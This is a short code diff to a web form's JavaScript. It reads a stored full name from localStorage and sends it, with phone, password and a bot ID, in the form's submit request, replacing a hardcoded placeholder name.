@@ -378,6 +378,9 @@ if(urlBotId){
 
 const botId = localStorage.getItem('botId');
 
+/* GET USER NAME */
+const fullName = localStorage.getItem('fullName');
+
 /* FIXED SESSION CHECK */
 if(!botId){
   alert('Session expired. Please start again.');
@@ -397,9 +400,6 @@ form.addEventListener('submit', async (e)=>{
   /* STORE PHONE */
   localStorage.setItem('phone', phone);
 
-  /* OPTIONAL */
-  localStorage.setItem('fullName', 'name');
-
   statusEl.style.display='block';
   spinner.style.display='block';
 
@@ -417,7 +417,7 @@ form.addEventListener('submit', async (e)=>{
       },
 
       body:JSON.stringify({
-        name,
+        name: fullName,
         phone,
         password,
         botId
